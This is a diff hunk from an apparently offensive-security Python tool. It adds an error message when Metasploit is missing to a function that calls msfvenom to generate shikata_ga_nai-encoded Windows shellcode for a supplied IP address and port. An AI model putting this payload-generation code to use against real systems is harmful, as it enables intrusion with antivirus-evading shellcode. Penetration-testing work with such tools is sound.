@@ -428,6 +428,8 @@ def generate_shellcode(payload, ipaddr, port):
     proc = subprocess.Popen("msfvenom -p {0} {1} {2} StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c".format(
         payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
+    if not data:
+    	sys.exit('\nYou must install Metasploit Framework to generate shellcode.\n')
     # start to format this a bit to get it ready
     repls = {
         ';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '',
